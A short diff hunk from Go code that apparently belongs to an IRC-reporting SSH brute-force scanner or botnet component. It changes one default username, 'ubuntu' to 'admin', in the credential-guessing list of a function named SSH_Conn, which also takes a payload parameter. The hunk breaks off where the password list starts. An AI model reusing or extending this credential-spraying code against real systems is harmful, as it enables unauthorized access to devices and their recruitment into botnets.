@@ -146,7 +146,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"ubuntu", "root", "user", "guest", "support", "login", "pi",
+		"admin", "root", "user", "guest", "support", "login", "pi",
 	}
 
 	passList := []string{
